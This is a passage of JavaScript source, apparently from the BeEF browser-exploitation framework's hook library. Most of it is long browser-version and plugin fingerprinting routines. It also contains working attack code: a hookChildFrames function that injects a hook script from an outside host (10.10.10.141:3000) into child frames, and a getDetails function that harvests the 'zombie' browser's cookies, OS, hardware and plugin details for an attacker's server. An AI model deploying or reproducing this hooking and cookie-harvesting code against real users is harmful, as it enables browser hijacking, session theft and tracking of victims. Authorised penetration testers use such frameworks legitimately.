        if (this.isC36()) {
            return '36'
        }
        ;// Chrome 36
        if (this.isC36iOS()) {
            return '36'
        }
        ;// Chrome 36 for iOS
        if (this.isC37()) {
            return '37'
        }
        ;// Chrome 37
        if (this.isC37iOS()) {
            return '37'
        }
        ;// Chrome 37 for iOS
        if (this.isC38()) {
            return '38'
        }
        ;// Chrome 38
        if (this.isC38iOS()) {
            return '38'
        }
        ;// Chrome 38 for iOS
        if (this.isC39()) {
            return '39'
        }
        ;// Chrome 39
        if (this.isC39iOS()) {
            return '39'
        }
        ;// Chrome 39 for iOS
        if (this.isC40()) {
            return '40'
        }
        ;// Chrome 40
        if (this.isC40iOS()) {
            return '40'
        }
        ;// Chrome 40 for iOS
        if (this.isC41()) {
            return '41'
        }
        ;// Chrome 41
        if (this.isC41iOS()) {
            return '41'
        }
        ;// Chrome 41 for iOS
        if (this.isC42()) {
            return '42'
        }
        ;// Chrome 42
        if (this.isC42iOS()) {
            return '42'
        }
        ;// Chrome 42 for iOS
        if (this.isC43()) {
            return '43'
        }
        ;// Chrome 43
        if (this.isC43iOS()) {
            return '43'
        }
        ;// Chrome 43 for iOS
        if (this.isC44()) {
            return '44'
        }
        ;// Chrome 44
        if (this.isC44iOS()) {
            return '44'
        }
        ;// Chrome 44 for iOS
        if (this.isC45()) {
            return '45'
        }
        ;// Chrome 45
        if (this.isC45iOS()) {
            return '45'
        }
        ;// Chrome 45 for iOS
        if (this.isC46()) {
            return '46'
        }
        ;// Chrome 46
        if (this.isC46iOS()) {
            return '46'
        }
        ;// Chrome 46 for iOS
        if (this.isC47()) {
            return '47'
        }
        ;// Chrome 47
        if (this.isC47iOS()) {
            return '47'
        }
        ;// Chrome 47 for iOS
        if (this.isC48()) {
            return '48'
        }
        ;// Chrome 48
        if (this.isC48iOS()) {
            return '48'
        }
        ;// Chrome 48 for iOS
        if (this.isC49()) {
            return '49'
        }
        ;// Chrome 49
        if (this.isC49iOS()) {
            return '49'
        }
        ;// Chrome 49 for iOS
        if (this.isC50()) {
            return '50'
        }
        ;// Chrome 50
        if (this.isC50iOS()) {
            return '50'
        }
        ;// Chrome 50 for iOS
        if (this.isC51()) {
            return '51'
        }
        ;// Chrome 51
        if (this.isC51iOS()) {
            return '51'
        }
        ;// Chrome 51 for iOS
        if (this.isC52()) {
            return '52'
        }
        ;// Chrome 52
        if (this.isC52iOS()) {
            return '52'
        }
        ;// Chrome 52 for iOS
        if (this.isC53()) {
            return '53'
        }
        ;// Chrome 53
        if (this.isC53iOS()) {
            return '53'
        }
        ;// Chrome 53 for iOS
        if (this.isC54()) {
            return '54'
        }
        ;// Chrome 54
        if (this.isC54iOS()) {
            return '54'
        }
        ;// Chrome 54 for iOS
        if (this.isC55()) {
            return '55'
        }
        ;// Chrome 55
        if (this.isC55iOS()) {
            return '55'
        }
        ;// Chrome 55 for iOS
        if (this.isC56()) {
            return '56'
        }
        ;// Chrome 56
        if (this.isC56iOS()) {
            return '56'
        }
        ;// Chrome 56 for iOS
        if (this.isC57()) {
            return '57'
        }
        ;// Chrome 57
        if (this.isC57iOS()) {
            return '57'
        }
        ;// Chrome 57 for iOS
        if (this.isC58()) {
            return '58'
        }
        ;// Chrome 58
        if (this.isC58iOS()) {
            return '58'
        }
        ;// Chrome 58 for iOS

        if (this.isFF2()) {
            return '2'
        }
        ;// Firefox 2
        if (this.isFF3()) {
            return '3'
        }
        ;// Firefox 3
        if (this.isFF3_5()) {
            return '3.5'
        }
        ;// Firefox 3.5
        if (this.isFF3_6()) {
            return '3.6'
        }
        ;// Firefox 3.6
        if (this.isFF4()) {
            return '4'
        }
        ;// Firefox 4
        if (this.isFF5()) {
            return '5'
        }
        ;// Firefox 5
        if (this.isFF6()) {
            return '6'
        }
        ;// Firefox 6
        if (this.isFF7()) {
            return '7'
        }
        ;// Firefox 7
        if (this.isFF8()) {
            return '8'
        }
        ;// Firefox 8
        if (this.isFF9()) {
            return '9'
        }
        ;// Firefox 9
        if (this.isFF10()) {
            return '10'
        }
        ;// Firefox 10
        if (this.isFF11()) {
            return '11'
        }
        ;// Firefox 11
        if (this.isFF12()) {
            return '12'
        }
        ;// Firefox 12
        if (this.isFF13()) {
            return '13'
        }
        ;// Firefox 13
        if (this.isFF14()) {
            return '14'
        }
        ;// Firefox 14
        if (this.isFF15()) {
            return '15'
        }
        ;// Firefox 15
        if (this.isFF16()) {
            return '16'
        }
        ;// Firefox 16
        if (this.isFF17()) {
            return '17'
        }
        ;// Firefox 17
        if (this.isFF18()) {
            return '18'
        }
        ;// Firefox 18
        if (this.isFF19()) {
            return '19'
        }
        ;// Firefox 19
        if (this.isFF20()) {
            return '20'
        }
        ;// Firefox 20
        if (this.isFF21()) {
            return '21'
        }
        ;// Firefox 21
        if (this.isFF22()) {
            return '22'
        }
        ;// Firefox 22
        if (this.isFF23()) {
            return '23'
        }
        ;// Firefox 23
        if (this.isFF24()) {
            return '24'
        }
        ;// Firefox 24
        if (this.isFF25()) {
            return '25'
        }
        ;// Firefox 25
        if (this.isFF26()) {
            return '26'
        }
        ;// Firefox 26
        if (this.isFF27()) {
            return '27'
        }
        ;// Firefox 27
        if (this.isFF28()) {
            return '28'
        }
        ;// Firefox 28
        if (this.isFF29()) {
            return '29'
        }
        ;// Firefox 29
        if (this.isFF30()) {
            return '30'
        }
        ;// Firefox 30
        if (this.isFF31()) {
            return '31'
        }
        ;// Firefox 31
        if (this.isFF32()) {
            return '32'
        }
        ;// Firefox 32
        if (this.isFF33()) {
            return '33'
        }
        ;// Firefox 33
        if (this.isFF34()) {
            return '34'
        }
        ;// Firefox 34
        if (this.isFF35()) {
            return '35'
        }
        ;// Firefox 35
        if (this.isFF36()) {
            return '36'
        }
        ;// Firefox 36
        if (this.isFF37()) {
            return '37'
        }
        ;// Firefox 37
        if (this.isFF38()) {
            return '38'
        }
        ;// Firefox 38
        if (this.isFF39()) {
            return '39'
        }
        ;// Firefox 39
        if (this.isFF40()) {
            return '40'
        }
        ;// Firefox 40
        if (this.isFF41()) {
            return '41'
        }
        ;// Firefox 41
        if (this.isFF42()) {
            return '42'
        }
        ;// Firefox 42
        if (this.isFF43()) {
            return '43'
        }
        ;// Firefox 43
        if (this.isFF44()) {
            return '44'
        }
        ;// Firefox 44
        if (this.isFF45()) {
            return '45'
        }
        ;// Firefox 45
        if (this.isFF46()) {
            return '46'
        }
        ;// Firefox 46
        if (this.isFF47()) {
            return '47'
        }
        ;// Firefox 47
        if (this.isFF48()) {
            return '48'
        }
        ;// Firefox 48
        if (this.isFF49()) {
            return '49'
        }
        ;// Firefox 49
        if (this.isFF50()) {
            return '50'
        }
        ;// Firefox 50
        if (this.isFF51()) {
            return '51'
        }
        ;// Firefox 51
        if (this.isFF52()) {
            return '52'
        }
        ;// Firefox 52
        if (this.isFF53()) {
            return '53'
        }
        ;// Firefox 53
        if (this.isFF54()) {
            return '54'
        }
        ;// Firefox 54
        if (this.isFF55()) {
            return '55'
        }
        ;// Firefox 55
        if (this.isFF56()) {
            return '56'
        }
        ;// Firefox 56
        if (this.isFF57()) {
            return '57'
        }
        ;// Firefox 57
        if (this.isFF58()) {
            return '58'
        }
        ;// Firefox 58
        if (this.isFF59()) {
            return '59'
        }
        ;// Firefox 59
        if (this.isFF60()) {
            return '60'
        }
        ;// Firefox 60
        if (this.isFF61()) {
            return '61'
        }
        ;// Firefox 61
        if (this.isFF62()) {
            return '62'
        }
        ;// Firefox 62
        if (this.isFF63()) {
            return '63'
        }
        ;// Firefox 63
        if (this.isFF64()) {
            return '64'
        }
        ;// Firefox 64
        if (this.isFF65()) {
            return '65'
        }
        ;// Firefox 65
        if (this.isFF66()) {
            return '66'
        }
        ;// Firefox 66
        if (this.isFF67()) {
            return '67'
        }
        ;// Firefox 67
        if (this.isFF68()) {
            return '68'
        }
        ;// Firefox 68
        if (this.isFF69()) {
            return '69'
        }
        ;// Firefox 69
        if (this.isFF70()) {
            return '70'
        }
        ;// Firefox 70
        if (this.isFF71()) {
            return '71'
        }
        ;// Firefox 71
        if (this.isFF72()) {
            return '72'
        }
        ;// Firefox 72
        if (this.isFF73()) {
            return '73'
        }
        ;// Firefox 73
        if (this.isFF74()) {
            return '74'
        }
        ;// Firefox 74
        if (this.isFF75()) {
            return '75'
        }
        ;// Firefox 75
        if (this.isFF76()) {
            return '76'
        }
        ;// Firefox 76
        if (this.isFF77()) {
            return '77'
        }
        ;// Firefox 77
        if (this.isFF78()) {
            return '78'
        }
        ;// Firefox 78
        if (this.isFF79()) {
            return '79'
        }
        ;// Firefox 79
        if (this.isFF80()) {
            return '80'
        }
        ;// Firefox 80
        if (this.isFF81()) {
            return '81'
        }
        ;// Firefox 81
        if (this.isFF82()) {
            return '82'
        }
        ;// Firefox 82
        if (this.isFF83()) {
            return '83'
        }
        ;// Firefox 83
        if (this.isFF84()) {
            return '84'
        }
        ;// Firefox 84
        if (this.isFF85()) {
            return '85'
        }
        ;// Firefox 85
        if (this.isFF86()) {
            return '86'
        }
        ;// Firefox 86
        if (this.isFF87()) {
            return '87'
        }
        ;// Firefox 87
        if (this.isFF88()) {
            return '88'
        }
        ;// Firefox 88
        if (this.isFF89()) {
            return '89'
        }
        ;// Firefox 89
        if (this.isFF90()) {
            return '90'
        }
        ;// Firefox 90
        if (this.isFF91()) {
            return '91'
        }
        ;// Firefox 91
        if (this.isFF92()) {
            return '92'
        }
        ;// Firefox 92
        if (this.isFF93()) {
            return '93'
        }
        ;// Firefox 93
        if (this.isFF94()) {
            return '94'
        }
        ;// Firefox 94
        if (this.isFF95()) {
            return '95'
        }
        ;// Firefox 95
        if (this.isFF96()) {
            return '96'
        }
        ;// Firefox 96
        if (this.isFF97()) {
            return '97'
        }
        ;// Firefox 97
        if (this.isFF98()) {
            return '98'
        }
        ;// Firefox 98
        if (this.isFF99()) {
            return '99'
        }
        ;// Firefox 99

        if (this.isIE6()) {
            return '6'
        }
        ;// Internet Explorer 6
        if (this.isIE7()) {
            return '7'
        }
        ;// Internet Explorer 7
        if (this.isIE8()) {
            return '8'
        }
        ;// Internet Explorer 8
        if (this.isIE9()) {
            return '9'
        }
        ;// Internet Explorer 9
        if (this.isIE10()) {
            return '10'
        }
        ;// Internet Explorer 10
        if (this.isIE11()) {
            return '11'
        }
        ;// Internet Explorer 11

        if (this.isEdge()) {
            return '1'
        }
        ;// Microsoft Edge

        if (this.isEpi()) {
            // believe the UserAgent string for version info - until whenever
            var epiphanyRe = /Epiphany\/(\d+)/;
            var versionDetails = epiphanyRe.exec(beef.browser.getBrowserReportedName());
            if (versionDetails.length > 1) {
                return versionDetails[1];
            } else {
                return "UNKNOWN";
                // returns from here or it may take Safari version details
            }
        }
        ;// Epiphany

        if (this.isS4()) {
            return '4'
        }
        ;// Safari 4
        if (this.isS5()) {
            return '5'
        }
        ;// Safari 5
        if (this.isS6()) {
            return '6'
        }
        ;// Safari 6

        if (this.isS7()) {
            return '7'
        }
        ;// Safari 7
        if (this.isS8()) {
            return '8'
        }
        ;// Safari 8

        if (this.isO9_52()) {
            return '9.5'
        }
        ;// Opera 9.5x
        if (this.isO9_60()) {
            return '9.6'
        }
        ;// Opera 9.6
        if (this.isO10()) {
            return '10'
        }
        ;// Opera 10.xx
        if (this.isO11()) {
            return '11'
        }
        ;// Opera 11.xx
        if (this.isO12()) {
            return '12'
        }
        ;// Opera 12.xx

        // platform.js
        try {
            var version = platform.version;
            if (!!version)
                return version;
        } catch (e) {}

        return 'UNKNOWN';
        // Unknown UA
    },

    /**
     * Returns the type of user agent by hooked browser.
     * @return: {String} User agent software.
     *
     * @example: beef.browser.getBrowserName()
     */
    getBrowserName: function() {
        if (this.isEdge()) {
            return 'E'
        }
        ;// Microsoft Edge any version
        if (this.isC()) {
            return 'C'
        }
        ;// Chrome any version
        if (this.isFF()) {
            return 'FF'
        }
        ;// Firefox any version
        if (this.isIE()) {
            return 'IE'
        }
        ;// Internet Explorer any version
        if (this.isO()) {
            return 'O'
        }
        ;// Opera any version
        if (this.isEpi()) {
            return 'EP'
        }
        ;// Epiphany any version
        if (this.isS()) {
            return 'S'
        }
        ;// Safari any version
        if (this.isA()) {
            return 'A'
        }
        ;// Avant any version
        if (this.isMidori()) {
            return 'MI'
        }
        ;// Midori any version
        if (this.isOdyssey()) {
            return 'OD'
        }
        ;// Odyssey any version
        if (this.isBrave()) {
            return 'BR'
        }
        ;// Brave any version
        return 'UNKNOWN';
        // Unknown UA
    },

    /**
     * Hooks all child frames in the current window
     * Restricted by same-origin policy
     */
    hookChildFrames: function() {

        // create script object
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = 'http://10.10.10.141:3000/hook.js';

        // loop through child frames
        for (var i = 0; i < self.frames.length; i++) {
            try {
                // append hook script
                self.frames[i].document.body.appendChild(script);
                beef.debug("Hooked child frame [src:" + self.frames[i].window.location.href + "]");
            } catch (e) {
                // warn on cross-origin
                beef.debug("Hooking child frame failed: " + e.message);
            }
        }
    },

    /**
     * Checks if the zombie has flash installed and enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasFlash()) { ... }
     */
    hasFlash: function() {
        if (!beef.browser.isIE()) {
            return (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]);
        }

        if (!!navigator.plugins) {
            return (navigator.plugins["Shockwave Flash"] != undefined);
        }

        // IE
        var flash_versions = 12;
        if (window.ActiveXObject != null) {
            for (x = 2; x <= flash_versions; x++) {
                try {
                    Flash = eval("new ActiveXObject('ShockwaveFlash.ShockwaveFlash." + x + "');");
                    if (Flash) {
                        return true;
                    }
                } catch (e) {
                    beef.debug("Creating Flash ActiveX object failed: " + e.message);
                }
            }
        }

        return false;
    },

    /**
     * Checks if the zombie has the QuickTime plugin installed.
     * @return: {Boolean} true or false.
     *
     * @example: if ( beef.browser.hasQuickTime() ) { ... }
     */
    hasQuickTime: function() {
        if (!!navigator.plugins) {
            for (i = 0; i < navigator.plugins.length; i++) {
                if (navigator.plugins[i].name.indexOf("QuickTime") >= 0) {
                    return true;
                }
            }
        }

        // IE
        try {
            var qt_test = new ActiveXObject('QuickTime.QuickTime');
            if (qt_test) {
                return true;
            }
        } catch (e) {
            beef.debug("Creating QuickTime ActiveX object failed: " + e.message);
        }

        return false;
    },

    /**
     * Checks if the zombie has the RealPlayer plugin installed.
     * @return: {Boolean} true or false.
     *
     * @example: if ( beef.browser.hasRealPlayer() ) { ... }
     */
    hasRealPlayer: function() {

        if (!!navigator.plugins) {
            for (i = 0; i < navigator.plugins.length; i++) {
                if (navigator.plugins[i].name.indexOf("RealPlayer") >= 0) {
                    return true;
                }
            }
        }

        // IE
        var definedControls = ['RealPlayer', 'rmocx.RealPlayer G2 Control', 'rmocx.RealPlayer G2 Control.1', 'RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)', 'RealVideo.RealVideo(tm) ActiveX Control (32-bit)'];

        for (var i = 0; i < definedControls.length; i++) {
            try {
                var rp_test = new ActiveXObject(definedControls[i]);
                if (rp_test) {
                    return true;
                }
            } catch (e) {
                beef.debug("Creating RealPlayer ActiveX object failed: " + e.message);
            }
        }

        return false;
    },

    /**
     * Checks if the zombie has the Windows Media Player plugin installed.
     * @return: {Boolean} true or false.
     *
     * @example: if ( beef.browser.hasWMP() ) { ... }
     */
    hasWMP: function() {
        if (!!navigator.plugins) {
            for (i = 0; i < navigator.plugins.length; i++) {
                if (navigator.plugins[i].name.indexOf("Windows Media Player") >= 0) {
                    return true;
                }
            }
        }

        // IE
        try {
            var wmp_test = new ActiveXObject('WMPlayer.OCX');
            if (wmp_test) {
                return true;
            }
        } catch (e) {
            beef.debug("Creating WMP ActiveX object failed: " + e.message);
        }

        return false;
    },

    /**
     *  Checks if VLC is installed
     *  @return: {Boolean} true or false
     **/
    hasVLC: function() {
        if (beef.browser.isIE() || beef.browser.isEdge()) {
            try {
                control = new ActiveXObject("VideoLAN.VLCPlugin.2");
                return true;
            } catch (e) {
                beef.debug("Creating VLC ActiveX object failed: " + e.message);
            }
        } else {
            for (i = 0; i < navigator.plugins.length; i++) {
                if (navigator.plugins[i].name.indexOf("VLC") >= 0) {
                    return true;
                }
            }
        }
        return false;
    },

    /**
     * Checks if the zombie has Java enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.javaEnabled()) { ... }
     */
    javaEnabled: function() {
        return navigator.javaEnabled();
    },

    /**
     * Checks if the Phonegap API is available from the hooked origin.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasPhonegap()) { ... }
     */
    hasPhonegap: function() {
        var result = false;

        try {
            if (!!device.phonegap || !!device.cordova)
                result = true;
            else
                result = false;
        } catch (e) {
            result = false;
        }
        return result;
    },

    /**
     * Checks if the browser supports CORS
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasCors()) { ... }
     */
    hasCors: function() {
        if ('withCredentials'in new XMLHttpRequest())
            return true;
        else if (typeof XDomainRequest !== "undefined")
            return true;
        else
            return false;
    },

    /**
     * Checks if the zombie has Java installed and enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasJava()) { ... }
     */
    hasJava: function() {
        if (beef.browser.getPlugins().match(/java/i) && beef.browser.javaEnabled()) {
            return true;
        } else {
            return false;
        }
    },

    /**
     * Checks if the zombie has VBScript enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasVBScript()) { ... }
     */
    hasVBScript: function() {
        if ((navigator.userAgent.indexOf('MSIE') != -1) && (navigator.userAgent.indexOf('Win') != -1)) {
            return true;
        } else {
            return false;
        }
    },

    /**
     * Returns the list of plugins installed in the browser.
     */
    getPlugins: function() {

        var results;
        Array.prototype.unique = function() {
            var o = {}, i, l = this.length, r = [];
            for (i = 0; i < l; i += 1)
                o[this[i]] = this[i];
            for (i in o)
                r.push(o[i]);
            return r;
        }
        ;

        // Things lacking navigator.plugins
        if (!navigator.plugins)
            return this.getPluginsIE();

        // All other browsers that support navigator.plugins
        if (navigator.plugins && navigator.plugins.length > 0) {
            results = new Array();
            for (var i = 0; i < navigator.plugins.length; i++) {

                // Firefox returns exact plugin versions
                if (beef.browser.isFF())
                    results[i] = navigator.plugins[i].name + '-v.' + navigator.plugins[i].version;

                    // Webkit and Presto (Opera)
                    // Don't support the version attribute
                    // Sometimes store the version in description (Real, Adobe)
                else
                    results[i] = navigator.plugins[i].name;
                // + '-desc.' + navigator.plugins[i].description;
            }
            results = results.unique().toString();

            // All browsers that don't support navigator.plugins
        } else {
            results = new Array();
            //firefox https://bugzilla.mozilla.org/show_bug.cgi?id=757726
            // On linux sistem the "version" slot is empty so I'll attach "description" after version
            var plugins = {

                'AdobeAcrobat': {
                    'control': 'Adobe Acrobat',
                    'return': function(control) {
                        try {
                            version = navigator.plugins["Adobe Acrobat"]["description"];
                            return 'Adobe Acrobat Version  ' + version;
                            //+ " description "+ filename;

                        } catch (e) {}

                    }
                },
                'Flash': {
                    'control': 'Shockwave Flash',
                    'return': function(control) {
                        try {
                            version = navigator.plugins["Shockwave Flash"]["description"];
                            return 'Flash Player Version ' + version;
                            //+ " description "+ filename;
                        }
                        catch (e) {}
                    }
                },
                'Google_Talk_Plugin_Accelerator': {
                    'control': 'Google Talk Plugin Video Accelerator',
                    'return': function(control) {

                        try {
                            version = navigator.plugins['Google Talk Plugin Video Accelerator']["description"];
                            return 'Google Talk Plugin Video Accelerator Version ' + version;
                            //+ " description "+ filename;
                        } catch (e) {}
                    }
                },
                'Google_Talk_Plugin': {
                    'control': 'Google Talk Plugin',
                    'return': function(control) {
                        try {
                            version = navigator.plugins['Google Talk Plugin']["description"];
                            return 'Google Talk Plugin Version ' + version;
                            // " description "+ filename;
                        } catch (e) {}
                    }
                },
                'Facebook_Video_Calling_Plugin': {
                    'control': 'Facebook Video Calling Plugin',
                    'return': function(control) {
                        try {
                            version = navigator.plugins["Facebook Video Calling Plugin"]["description"];
                            return 'Facebook Video Calling Plugin Version ' + version;
                            //+ " description "+ filename;
                        } catch (e) {}
                    }
                },
                'Google_Update': {
                    'control': 'Google Update',
                    'return': function(control) {
                        try {
                            version = navigator.plugins["Google Update"]["description"];
                            return 'Google Update Version ' + version
                            //+ " description "+ filename;
                        } catch (e) {}
                    }
                },
                'Windows_Activation_Technologies': {
                    'control': 'Windows Activation Technologies',
                    'return': function(control) {
                        try {
                            version = navigator.plugins["Windows Activation Technologies"]["description"];
                            return 'Windows Activation Technologies Version ' + version;
                            //+ " description "+ filename;
                        } catch (e) {}

                    }
                },
                'VLC_Web_Plugin': {
                    'control': 'VLC Web Plugin',
                    'return': function(control) {
                        try {
                            version = navigator.plugins["VLC Web Plugin"]["description"];
                            return 'VLC Web Plugin Version ' + version;
                            //+ " description "+ filename;
                        } catch (e) {}
                    }
                },
                'Google_Earth_Plugin': {
                    'control': 'Google Earth Plugin',

                    'return': function(control) {
                        try {
                            version = navigator.plugins['Google Earth Plugin']["description"];
                            return 'Google Earth Plugin Version ' + version;
                            //+ " description "+ filename;
                        } catch (e) {}
                    }
                },
                'FoxitReader_Plugin': {
                    'control': 'FoxitReader Plugin',
                    'return': function(control) {
                        try {
                            version = navigator.plugins['Foxit Reader Plugin for Mozilla']['version'];
                            return 'FoxitReader Plugin Version ' + version;
                        } catch (e) {}
                    }
                }
            };

            var c = 0;
            for (var i in plugins) {
                //each element od plugins
                var control = plugins[i]['control'];
                try {
                    var version = plugins[i]['return'](control);
                    if (version) {
                        results[c] = version;
                        c = c + 1;
                    }
                } catch (e) {}

            }
        }
        // Return results
        return results;
    },

    /**
     * Returns a list of plugins detected by IE. This is a hack because IE doesn't
     * support navigator.plugins
     */
    getPluginsIE: function() {
        var results = '';
        var plugins = {
            'AdobePDF6': {
                'control': 'PDF.PdfCtrl',
                'return': function(control) {
                    version = control.getVersions().split(',');
                    version = version[0].split('=');
                    return 'Acrobat Reader v' + parseFloat(version[1]);
                }
            },
            'AdobePDF7': {
                'control': 'AcroPDF.PDF',
                'return': function(control) {
                    version = control.getVersions().split(',');
                    version = version[0].split('=');
                    return 'Acrobat Reader v' + parseFloat(version[1]);
                }
            },
            'Flash': {
                'control': 'ShockwaveFlash.ShockwaveFlash',
                'return': function(control) {
                    version = control.getVariable('$version').substring(4);
                    return 'Flash Player v' + version.replace(/,/g, ".");
                }
            },
            'Quicktime': {
                'control': 'QuickTime.QuickTime',
                'return': function(control) {
                    return 'QuickTime Player';
                }
            },
            'RealPlayer': {
                'control': 'RealPlayer',
                'return': function(control) {
                    version = control.getVersionInfo();
                    return 'RealPlayer v' + parseFloat(version);
                }
            },
            'Shockwave': {
                'control': 'SWCtl.SWCtl',
                'return': function(control) {
                    version = control.ShockwaveVersion('').split('r');
                    return 'Shockwave v' + parseFloat(version[0]);
                }
            },
            'WindowsMediaPlayer': {
                'control': 'WMPlayer.OCX',
                'return': function(control) {
                    return 'Windows Media Player v' + parseFloat(control.versionInfo);
                }
            },
            'FoxitReaderPlugin': {
                'control': 'FoxitReader.FoxitReaderCtl.1',
                'return': function(control) {
                    return 'Foxit Reader Plugin v' + parseFloat(control.versionInfo);
                }
            }
        };
        if (window.ActiveXObject) {
            var j = 0;
            for (var i in plugins) {
                var control = null;
                var version = null;
                try {
                    control = new ActiveXObject(plugins[i]['control']);
                } catch (e) {}
                if (control) {
                    if (j != 0)
                        results += ', ';
                    results += plugins[i]['return'](control);
                    j++;
                }
            }
        }
        return results;
    },

    /**
     * Returns zombie browser window size.
     * @from: http://www.howtocreate.co.uk/tutorials/javascript/browserwindow
     */
    getWindowSize: function() {
        var myWidth = 0
          , myHeight = 0;
        if (typeof (window.innerWidth) == 'number') {
            // Non-IE
            myWidth = window.innerWidth;
            myHeight = window.innerHeight;
        } else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
            // IE 6+ in 'standards compliant mode'
            myWidth = document.documentElement.clientWidth;
            myHeight = document.documentElement.clientHeight;
        } else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
            // IE 4 compatible
            myWidth = document.body.clientWidth;
            myHeight = document.body.clientHeight;
        }
        return {
            width: myWidth,
            height: myHeight
        }
    },

    /**
     * Construct hash from browser details. This function is used to grab the browser details during the hooking process
     */
    getDetails: function() {
        var details = new Array();

        var browser_name = beef.browser.getBrowserName();
        var browser_version = beef.browser.getBrowserVersion();
        var browser_engine = beef.browser.getBrowserEngine();
        var browser_reported_name = beef.browser.getBrowserReportedName();
        var browser_language = beef.browser.getBrowserLanguage();
        var page_title = (document.title) ? document.title : "Unknown";
        var origin = (window.origin) ? window.origin : "Unknown";
        var page_uri = (document.location.href) ? document.location.href : "Unknown";
        var page_referrer = (document.referrer) ? document.referrer : "Unknown";
        var page_hostname = (document.location.hostname) ? document.location.hostname : "Unknown";
        var default_port = "";
        switch (document.location.protocol) {
        case "http:":
            var default_port = "80";
            break;
        case "https:":
            var default_port = "443";
            break;
        }
        var page_hostport = (document.location.port) ? document.location.port : default_port;
        var browser_plugins = beef.browser.getPlugins();
        var date_stamp = new Date().toString();
        var os_name = beef.os.getName();
        var os_family = beef.os.getFamily();
        var os_version = beef.os.getVersion();
        var os_arch = beef.os.getArch();
        var default_browser = beef.os.getDefaultBrowser();
        var hw_type = beef.hardware.getName();
        var battery_details = beef.hardware.getBatteryDetails();
        try {
            var battery_charging_status = battery_details.chargingStatus;
            var battery_level = battery_details.batteryLevel;
            var battery_charging_time = battery_details.chargingTime;
            var battery_discharging_time = battery_details.dischargingTime;
        } catch (e) {}
        var memory = beef.hardware.getMemory();
        var cpu_arch = beef.hardware.getCpuArch();
        var cpu_cores = beef.hardware.getCpuCores();
        var gpu_details = beef.hardware.getGpuDetails();
        try {
            var gpu = gpu_details.gpu;
            var gpu_vendor = gpu_details.vendor;
        } catch (e) {}
        var touch_enabled = (beef.hardware.isTouchEnabled()) ? "Yes" : "No";
        var browser_platform = (typeof (navigator.platform) != "undefined" && navigator.platform != "") ? navigator.platform : 'Unknown';
        var screen_size = beef.hardware.getScreenSize();
        try {
            var screen_width = screen_size.width;
            var screen_height = screen_size.height;
            var screen_colordepth = screen_size.colordepth;
        } catch (e) {}
        var window_size = beef.browser.getWindowSize();
        try {
            window_width = window_size.width;
            window_height = window_size.height;
        } catch (e) {}
        var vbscript_enabled = (beef.browser.hasVBScript()) ? "Yes" : "No";
        var has_flash = (beef.browser.hasFlash()) ? "Yes" : "No";
        var has_silverlight = (beef.browser.hasSilverlight()) ? "Yes" : "No";
        var has_phonegap = (beef.browser.hasPhonegap()) ? "Yes" : "No";
        var has_googlegears = (beef.browser.hasGoogleGears()) ? "Yes" : "No";
        var has_web_socket = (beef.browser.hasWebSocket()) ? "Yes" : "No";
        var has_web_worker = (beef.browser.hasWebWorker()) ? "Yes" : "No";
        var has_web_gl = (beef.browser.hasWebGL()) ? "Yes" : "No";
        var has_webrtc = (beef.browser.hasWebRTC()) ? "Yes" : "No";
        var has_activex = (beef.browser.hasActiveX()) ? "Yes" : "No";
        var has_quicktime = (beef.browser.hasQuickTime()) ? "Yes" : "No";
        var has_realplayer = (beef.browser.hasRealPlayer()) ? "Yes" : "No";
        var has_wmp = (beef.browser.hasWMP()) ? "Yes" : "No";
        var has_vlc = (beef.browser.hasVLC()) ? "Yes" : "No";

        try {
            var cookies = document.cookie;
            /* Never stop the madness dear C.
             * var veglol = beef.browser.cookie.veganLol();
             */
            if (cookies)
                details['browser.window.cookies'] = cookies;
        } catch (e) {
            beef.debug("Cookies can't be read. The hooked origin is most probably using HttpOnly.");
            details['browser.window.cookies'] = '';
        }

        if (browser_name)
            details['browser.name'] = browser_name;
        if (browser_version)
            details['browser.version'] = browser_version;
        if (browser_engine)
            details['browser.engine'] = browser_engine;
        if (browser_reported_name)
            details['browser.name.reported'] = browser_reported_name;
        if (browser_platform)
            details['browser.platform'] = browser_platform;
        if (browser_language)
            details['browser.language'] = browser_language;
        if (browser_plugins)
            details['browser.plugins'] = browser_plugins;

        if (page_title)
            details['browser.window.title'] = page_title;
        if (origin)
            details['browser.window.origin'] = origin;
        if (page_hostname)
            details['browser.window.hostname'] = page_hostname;
        if (page_hostport)
            details['browser.window.hostport'] = page_hostport;
        if (page_uri)
            details['browser.window.uri'] = page_uri;
        if (page_referrer)
            details['browser.window.referrer'] = page_referrer;
        if (window_width)
            details['browser.window.size.width'] = window_width;
        if (window_height)
            details['browser.window.size.height'] = window_height;
        if (date_stamp)
            details['browser.date.datestamp'] = date_stamp;

        if (os_name)
            details['host.os.name'] = os_name;
        if (os_family)
            details['host.os.family'] = os_family;
        if (os_version)
            details['host.os.version'] = os_version;
        if (os_arch)
            details['host.os.arch'] = os_arch;

        if (default_browser)
            details['host.software.defaultbrowser'] = default_browser;

        if (hw_type)
            details['hardware.type'] = hw_type;
        if (memory)
            details['hardware.memory'] = memory;
        if (gpu)
            details['hardware.gpu'] = gpu;
        if (gpu_vendor)
            details['hardware.gpu.vendor'] = gpu_vendor;
        if (cpu_arch)
            details['hardware.cpu.arch'] = cpu_arch;
        if (cpu_cores)
            details['hardware.cpu.cores'] = cpu_cores;

        if (battery_charging_status)
            details['hardware.battery.chargingstatus'] = battery_charging_status;
        if (battery_level)
            details['hardware.battery.level'] = battery_level;
        if (battery_charging_time)
            details['hardware.battery.chargingtime'] = battery_charging_time;
        if (battery_discharging_time)
            details['hardware.battery.dischargingtime'] = battery_discharging_time;

        if (screen_width)
            details['hardware.screen.size.width'] = screen_width;
        if (screen_height)
            details['hardware.screen.size.height'] = screen_height;
        if (screen_colordepth)
            details['hardware.screen.colordepth'] = screen_colordepth;
        if (touch_enabled)
            details['hardware.screen.touchenabled'] = touch_enabled;

        if (vbscript_enabled)
            details['browser.capabilities.vbscript'] = vbscript_enabled;
        if (has_flash)
            details['browser.capabilities.flash'] = has_flash;
